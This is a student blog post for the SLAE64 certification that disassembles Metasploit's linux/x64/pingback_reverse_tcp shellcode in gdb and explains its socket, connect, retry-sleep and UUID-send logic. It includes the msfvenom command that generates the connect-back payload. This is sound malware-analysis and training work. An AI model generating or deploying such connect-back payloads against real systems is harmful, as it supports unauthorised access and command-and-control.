Title: SLAE64 - Assignment 5.2
Date: 2022-06-25T09:03:11.000Z

<h2 id="disclaimer">Disclaimer</h2><p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:</p><p><a href="https://www.pentesteracademy.com/course?id=7">https://www.pentesteracademy.com/course?id=7</a></p><p>Student ID: PA-30398</p><h2 id="analysis">Analysis</h2><p>For the fifth assignment, I decided to analyze the following shellcode samples:</p><!--kg-card-begin: markdown--><table>
<thead>
<tr>
<th>Name</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>linux/x64/meterpreter/reverse_tcp</td>
<td>Inject the mettle server payload (staged). Connect back to the attacker</td>
</tr>
<tr>
<td>linux/x64/pingback_reverse_tcp</td>
<td>Connect back to attacker and report UUID (Linux x64)</td>
</tr>
<tr>
<td>linux/x64/shell_bind_ipv6_tcp</td>
<td>Listen for an IPv6 connection and spawn a command shell</td>
</tr>
</tbody>
</table>
<!--kg-card-end: markdown--><p>In this post, I'll document the logic of the second shellcode, <code>linux/x64/pingback_reverse_tcp</code>.</p><p>Let's start from the very beginning, i.e. generating the shellcode, which you can do by means of the <em>ruby</em> script <code>msfvenom</code> available by default on Kali Linux distributions.</p><p>Follows the command I used in order to generate the shellcode for this assignment:</p><pre><code class="language-bash">msfvenom -p linux/x64/pingback_reverse_tcp LHOST=192.168.1.170 LPORT=443 -f elf -o shellcode        
# [-] WARNING: UUID cannot be saved because database is inactive.
# [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
# [-] No arch selected, selecting arch: x64 from the payload
# No encoder specified, outputting raw payload
# Payload size: 125 bytes
# Final size of elf file: 245 bytes
# Saved as: shellcode
</code></pre><p>Next, we can start the analysis using <code>gdb</code>:</p><pre><code class="language-bash">gdb -q ./shellcode
# Reading symbols from ./shellcode...
# (No debugging symbols found in ./shellcode)
(gdb) starti
# Starting program: /home/kali/slae64/exam/assignment/5/part/2/shellcode 

# Program stopped.
# 0x0000000000400078 in ?? ()
(gdb) x/12i $pc
# =&gt; 0x400078:    push   0xa
#    0x40007a:    pop    r9
#    0x40007c:    push   rsi
#    0x40007d:    push   rax
#    0x40007e:    push   0x29
#    0x400080:    pop    rax
#    0x400081:    cdq    
#    0x400082:    push   0x2
#    0x400084:    pop    rdi
#    0x400085:    push   0x1
#    0x400087:    pop    rsi
#    0x400088:    syscall
</code></pre><p>The last command I issued (<code>x/12i $pc</code>) prints 12 instructions from the current program counter.</p><p>Often times, you won't be able to use <code>disassemble</code> to show the next N assembly instructions, due to the fact there isn't a proper stack frame defined for the entry point.</p><p>As an example, when I ran the command <code>info registers</code>, I noticed the register <code>RBP</code> was set to 0.</p><p>An alternative to the command above is <code>x/12i $rip</code>, as they both to the same given that register <code>$rip</code> is the program counter in this case.</p><p>With this said, let's go back to analyzing the first block of instructions:</p><pre><code class="language-nasm">; store the value 10 into the register R9
push   0xa
pop    r9

; push the values of RSI and RAX on the stack
push   rsi
push   rax

; syscall number 41: sys_socket
push   0x29
pop    rax

; sign-extend EAX in order to clear RDX
cdq    

; set RDI to 2
push   0x2
pop    rdi

; set RSI to 1
push   0x1
pop    rsi

; invoke sys_socket
syscall
</code></pre><p>They can be converted to the following C code:</p><pre><code class="language-cpp">RAX = socket(
  2,            // AF_INET
  1,            // SOCK_STREAM
  0,            // IP protocol
);
</code></pre><p>It simply creates a new TCP socket. After that, we have the following instructions:</p><pre><code class="language-bash">(gdb) x/11i $rip
# =&gt; 0x40008a:    test   rax,rax
#    0x40008d:    js     0x4000ca
#    0x40008f:    xchg   rdi,rax
#    0x400091:    movabs rcx,0xaa01a8c0bb010002
#    0x40009b:    push   rcx
#    0x40009c:    mov    rsi,rsp
#    0x40009f:    push   0x10
#    0x4000a1:    pop    rdx
#    0x4000a2:    push   0x2a
#    0x4000a4:    pop    rax
#    0x4000a5:    syscall
</code></pre><p>The first instruction <em>tests</em> the value stored inside the register <code>RAX</code>, setting the appropriate flags.</p><!--kg-card-begin: markdown--><p>For example:</p>
<ul>
<li>if the value was 0, then the flag ZF (Zero Flag) would be set</li>
<li>if the value was negative (signed), then the SF (Sign Flag) would be set.</li>
</ul>
<!--kg-card-end: markdown--><p>In this case, if the value is signed, the instruction <code>js 0x4000ca</code> jumps to the address <code>0x4000ca</code>, which contains the following instructions:</p><pre><code class="language-bash">(gdb) x/5i 0x4000ca
  #  0x4000ca:    push   0x3c
  #  0x4000cc:    pop    rax
  #  0x4000cd:    push   0x1
  #  0x4000cf:    pop    rdi
  #  0x4000d0:    syscall
</code></pre><p>It's simply a call to the syscall <strong>0x3c </strong>(<code>sys_exit</code>), which returns the exit code 1 (stored inside the register <code>RDI</code>).</p><p>Let's analyze the other instructions following the <code>test</code>:</p><pre><code class="language-nasm">; save the file descriptor of the socket created previously into RDI
xchg   rdi,rax

; 0xaa -&gt; 170
; 0x01 -&gt; 1
; 0xa8 -&gt; 168
; 0xc0 -&gt; 192
; 0x01bb -&gt; 443
; 0x0002 -&gt; AF_INET
movabs rcx,0xaa01a8c0bb010002

; save the pointer to the previous data into RSI
push   rcx
mov    rsi,rsp

; set RDX to 16
push   0x10
pop    rdx

; set RAX to the calue 0x2a (syscall sys_connect)
push   0x2a
pop    rax

; invoke sys_connect
syscall
</code></pre><p>They can be converted to the following C code:</p><pre><code class="language-cpp">struct sockaddr_in RSI;

myaddr.sin_family = AF_INET;
myaddr.sin_port = htons(443);
inet_aton("192.168.1.170", &amp;myaddr.sin_addr.s_addr);

connect(RDI, (struct sockaddr*)RSI, 16);
</code></pre><p>It simply creates a <strong>sockaddr</strong> structure that stores the IP address and the TCP port, along with address family (<code>AF_INET</code>, i.e. IPv4), and then it is passed to the function <code>connect</code>.</p><p>The latter connects the file descriptor obtained from the <code>socket</code> syscall to the remote socket <code>192.168.1.170:443</code>.</p><p>After the call to <code>sys_connect</code>, the following instructions are run:</p><pre><code class="language-bash">(gdb) x/13i $rip
# =&gt; 0x4000a7:    pop    rcx
#    0x4000a8:    test   rax,rax
#    0x4000ab:    jns    0x4000d2
#    0x4000ad:    dec    r9
#    0x4000b0:    je     0x4000ca
#    0x4000b2:    push   rdi
#    0x4000b3:    push   0x23
#    0x4000b5:    pop    rax
#    0x4000b6:    push   0x0
#    0x4000b8:    push   0x5
#    0x4000ba:    mov    rdi,rsp
#    0x4000bd:    xor    rsi,rsi
#    0x4000c0:    syscall
</code></pre><p>Among the first instructions, there's a <code>pop rcx</code> that restores the old value of <code>RCX</code> (pushed by the instruction <code>0x40009b</code>).</p><p>After that, the instructions <code>test</code> and <code>jns</code> test whether the value returned by the syscall <code>connect</code> is signed or not. If the value is signed, hence negative, it means the function failed, and the socket client failed to connect to the socket server.</p><p>In that case, the shellcode doesn't perform any jumps, however it jumps to the address <code>0x4000ad</code>.</p><p>Let's analyze the instructions at that address:</p><pre><code class="language-nasm">; decrease the value stored in R9 (see 2 instructions at 0x400078)
; the initial value is 0xa
; is the value after dec is 0, the shellcode jumps to 0x4000ca
dec    r9
je     0x4000ca

; save the file descriptor of the socket created previously on the stack
push   rdi

; set RAX to 35 -&gt; sys_nanosleep
push   0x23
pop    rax

; create a timespec structure (5 seconds and 0 nanoseconds)
push   0x0
push   0x5

; get the address of the timespec structure and store it into RDI
mov    rdi,rsp

; clear RSI
xor    rsi,rsi

; invoke sys_nanosleep
syscall
</code></pre><p>These instructions can be converted to the following C code:</p><pre><code class="language-cpp">if (RAX &gt; 0)
{
  // 0x4000d2
}

if (R9 == 0)
{
  exit(1);
}

struct timespec t;
t.tv_sec = 5;
t.tv_nsec = 0;

nanosleep(&amp;t, NULL);
</code></pre><p>It seems the shellcode sleeps <strong>5 seconds</strong> if it can't connect the remote socket.</p><p>After the call to <code>sys_nanosleep</code> there this:</p><pre><code class="language-bash">(gdb) x/10i $pc
# =&gt; 0x4000c2:    pop    rcx
#    0x4000c3:    pop    rcx
#    0x4000c4:    pop    rdi
#    0x4000c5:    test   rax,rax
#    0x4000c8:    jns    0x400091
#    0x4000ca:    push   0x3c
#    0x4000cc:    pop    rax
#    0x4000cd:    push   0x1
#    0x4000cf:    pop    rdi
#    0x4000d0:    syscall
</code></pre><p>As you may notice, the shellcode uses the <code>POP</code> instruction 3 times:</p><ul><li>2 times in order to retrieve the value <code>0x0</code> and store it into <code>RCX</code></li><li>1 time in order to retrieve the file descriptor of the socket, and store it into <code>RDI</code></li></ul><p>After that, it checks if the return value of <code>sys_nanosleep</code> is positive (non-signed), thus jumping back to <code>0x400091</code> in order to execute <code>sys_connect</code> once again.</p><p>If the syscall <code>sys_nanosleep</code> returns a signed value, then the shellcode goes to the address <code>0x4000ca</code> to invoke the syscall <code>sys_exit</code>.</p><p>These operations are performed 9 times, for a total of <strong>45 seconds</strong> in case it can't connect to the remote server.</p><p>You can test this by using the shell command <code>time</code>:</p><pre><code class="language-bash">time ./shellcode

# real    45.01s
# user    0.00s
# sys     0.00s
# cpu     0%
</code></pre><p>Anyway, let's go back to the address <code>0x4000ab</code>. If the call to <code>connect</code> is successful, then the shellcode jumps to the address <code>0x4000d2</code>, which points to these instructions:</p><pre><code class="language-bash">(gdb) x/3i $pc
# =&gt; 0x4000d2:    push   0x10
#    0x4000d4:    pop    rdx
#    0x4000d5:    call   0x4000ea

(gdb) x/5i 0x4000ea
  #  0x4000ea:    pop    rsi
  #  0x4000eb:    xor    rax,rax
  #  0x4000ee:    inc    rax
  #  0x4000f1:    syscall 
  #  0x4000f3:    jmp    0x4000ca
</code></pre><p>First, the register <code>RDX</code> is set to the value <code>0x10</code>, and after that the shellcode jumps straight to the address <code>0x4000ea</code>, which calls <code>sys_write</code>.</p><pre><code class="language-nasm">; get the return address of the call, i.e. the address 0x4000da
pop rsi

; set RAX to 1 (sys_write)
xor rax,rax
inc rax

; invoke sys_write
syscalll

; jump to the address 0x4000ca
jmp 0x4000ca
</code></pre><p>The instructions above can be translated to the following code:</p><pre><code class="language-cpp">write(
  RDI,    // file descriptor of the client socket
  RSI,    // pointer to the buffer to write (0x4000da)
  RDX     // value: 16; it will write 16 bytes
);

// jmp 0x4000ca
</code></pre><p>The buffer containing the bytes that the shellcode is going to send to the remote server is stored at the address <code>0x4000da</code>, which is the return address of the current <code>call</code>.</p><p>In particular, the bytes are the following:</p><pre><code class="language-bash">(gdb) x/16xb 0x4000da
# 0x4000da:       0xe4    0x92    0xe3    0xc8    0xa4    0xbb    0x41    0x53
# 0x4000e2:       0xa8    0xfb    0x99    0x26    0xac    0x6c    0xd6    0x4c
</code></pre><p>Since it's 16 bytes, hence 32 hex digits, the resulting buffer can be represented by the following hex string:</p><pre><code class="language-txt">e492e3c8a4bb4153a8fb9926ac6cd64c
</code></pre><p>This string represents the so-called <em>Pingback UUID</em> of the shellcode. The source code from metasploit contains a reference to this value:</p><pre><code class="language-ruby">asm = %Q^
    ...
    send_pingback:
        push #{uuid_as_db.split(",").length} ; length of the PINGBACK UUID
        pop rdx
        call get_uuid_address         ; put uuid buffer on the stack
        db #{uuid_as_db}  ; PINGBACK_UUID
    ...
    ^
</code></pre><p>Back to the instructions, right after the shellcode sends the Pingback UUID to the remote server, it jumps to the address <code>0x4000ca</code>, which, ad mentioned previously, leads to <code>sys_exit</code>, thus terminating the execution of the shellcode.</p><p>Overall, it seems that the only thing it does is connect to the socket server and send the UUID stored within itself.</p>